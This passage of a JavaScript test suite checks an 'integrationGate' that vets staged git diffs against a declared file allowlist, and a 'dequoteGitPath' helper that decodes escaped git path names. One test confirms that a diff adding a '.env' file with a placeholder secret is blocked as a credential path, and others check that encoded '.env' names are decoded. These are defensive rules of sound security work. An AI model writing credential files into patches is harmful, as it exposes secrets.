		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git mv src/old.mjs src/new.mjs", { cwd: dir });
		});
		execSync("git reset -q HEAD -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		execSync("git checkout -q -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		// checkout restores tracked files but leaves the rename destination as
		// an untracked file — remove it so git apply can recreate it cleanly.
		rmSync(join(projectPath, "src", "new.mjs"), { force: true });

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["src/new.mjs"],
		});
		strictEqual(result.success, true);
	});

	it("rename: Files declaring the destination fails when only the source is declared", () => {
		commitFile(projectPath, "src/old.mjs", "original\n");
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git mv src/old.mjs src/new.mjs", { cwd: dir });
		});
		execSync("git reset -q HEAD -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		execSync("git checkout -q -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		rmSync(join(projectPath, "src", "new.mjs"), { force: true });

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["src/old.mjs"],
		});
		// The source path is counted via the summary line, but the destination
		// path (src/new.mjs) is also touched and undeclared — blocked.
		strictEqual(result.success, false);
		strictEqual(result.message, "undeclared_paths_touched");
		ok(result.extraPaths.includes("src/new.mjs"));
	});

	it("delete: Files declaring the deleted path passes (deleted path in --numstat)", () => {
		commitFile(projectPath, "src/gone.mjs", "original\n");
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git rm -q src/gone.mjs", { cwd: dir });
		});
		execSync("git reset -q HEAD -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		execSync("git checkout -q -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["src/gone.mjs"],
		});
		strictEqual(result.success, true);
	});

	it("sensitive paths still blocked even when in Files allowlist", () => {
		commitFile(projectPath, "config.json", "{}");
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, ".env"), "SECRET=xyz\n", "utf8");
		});
		const result = integrationGate(diff, projectPath, {
			requiredPaths: [".env"],
		});
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
	});

	it("manifest paths still require allowSensitiveManifests even when in Files allowlist", () => {
		commitFile(projectPath, "package.json", '{"name":"x"}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "package.json"), '{"name":"y"}\n', "utf8");
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["package.json"],
		});
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
	});

	it("rejects undeclared package-lock artifacts while preserving the exact Files allowlist", () => {
		commitFile(projectPath, "package-lock.json", '{"lockfileVersion":3}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "package-lock.json"),
				'{"lockfileVersion":3,"packages":{}}\n',
				"utf8",
			);
			writeFileSync(join(dir, "test.txt"), "declared source change\n", "utf8");
		});
		execSync("git checkout -- package-lock.json", {
			cwd: projectPath,
			stdio: "pipe",
		});
		execSync("git checkout -- test.txt", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["test.txt"],
		});
		strictEqual(result.success, false);
		strictEqual(result.message, "undeclared_paths_touched");
		ok(result.extraPaths.includes("package-lock.json"));
	});

	it("requires review for a lockfile even without an explicit Files allowlist", () => {
		commitFile(projectPath, "pnpm-lock.yaml", "lockfileVersion: '9.0'\n");
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "pnpm-lock.yaml"),
				"lockfileVersion: '9.0'\nimporters: {}\n",
				"utf8",
			);
		});
		execSync("git checkout -- pnpm-lock.yaml", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
		ok(result.sensitivePaths.includes("pnpm-lock.yaml"));
	});

	it("manifest path passes AllowManifests: true plus Files: together", () => {
		commitFile(projectPath, "package.json", '{"name":"x"}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "package.json"), '{"name":"y"}\n', "utf8");
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["package.json"],
			allowSensitiveManifests: true,
		});
		strictEqual(result.success, true);
	});

	it("null requiredPaths: legacy behavior preserved", () => {
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath, {
			requiredPaths: null,
		});
		strictEqual(result.success, true);
	});
});

describe("dequoteGitPath", () => {
	it("returns a plain unquoted path unchanged (common case, no-op)", () => {
		strictEqual(dequoteGitPath("src/index.mjs"), "src/index.mjs");
		strictEqual(dequoteGitPath(".env"), ".env");
		strictEqual(dequoteGitPath("café/.env"), "café/.env");
	});

	it("decodes multi-byte UTF-8 octal escape sequences as a whole", () => {
		// `é` is UTF-8 bytes 0xc3 0xa9 => `\303\251`; decode the byte array,
		// not each escape individually.
		strictEqual(dequoteGitPath('"caf\\303\\251/.env"'), "café/.env");
		// Emoji (4 bytes) exercises multi-byte decoding beyond 2 bytes.
		strictEqual(dequoteGitPath('"\\360\\237\\230\\200.txt"'), "😀.txt");
	});

	it("decodes escaped double-quote and backslash", () => {
		strictEqual(dequoteGitPath('"we\\"ird/.env"'), 'we"ird/.env');
		strictEqual(dequoteGitPath('"a\\\\b/.env"'), "a\\b/.env");
	});

	it("decodes control-character escapes such as \\t", () => {
		strictEqual(dequoteGitPath('"a\\tb.txt"'), "a\tb.txt");
		strictEqual(dequoteGitPath('"a\\nb.txt"'), "a\nb.txt");
	});
});
